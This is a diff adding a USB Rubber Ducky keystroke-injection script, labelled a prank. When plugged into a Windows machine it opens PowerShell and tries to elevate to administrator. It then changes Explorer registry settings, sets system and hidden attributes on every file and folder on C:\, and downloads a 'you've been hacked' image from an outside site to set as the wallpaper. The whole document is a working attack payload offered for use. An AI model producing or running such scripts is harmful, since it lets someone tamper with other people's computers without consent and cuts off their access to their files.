@@ -1,0 +1,52 @@
+REM Title: A_Ducky_Nightmare
+REM Author: Pol8y
+REM Description: Disable Hidden and SuperHidden file view in explorer, assign hidden attribute to every file and folder in C: and prevent reverting, download and set "you've been hacked" image as background
+REM Target: Windows / Powershell
+REM Version: 1.0
+REM Category: Prank
+
+
+REM -- Open Powershell --
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+
+REM --Start Powershell As Administrator & Exit Current Shell--
+
+STRING  Start-Process Powershell -Verb runAs; exit
+ENTER
+DELAY 300
+
+REM -- Disable Hidden Files View--
+
+STRING Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value "2"
+ENTER
+
+REM --Navigate To C:\ & Set Hidden Attribute To Each File And Folder--
+
+STRING cd /
+ENTER
+STRING attrib +s +h /s /d *; exit
+ENTER
+
+REM --Download Image And Set It As Background--
+
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 200
+STRING Invoke-WebRequest -Uri https://wallpaperaccess.com/full/896790.png -OutFile C:\hacked.png
+ENTER
+STRING Set-ItemProperty -Path "HKCU:Control Panel\Desktop" -Name WallPaper -Value C:\hacked.png
+ENTER
+STRING rundll32.exe user32.dll, UpdatePerUserSystemParameters 0, True; exit
+ENTER
+GUI d
+
+
+REM --Reverting Requires "attrib -s -h /s /d *" to be run with powershell from C:\--
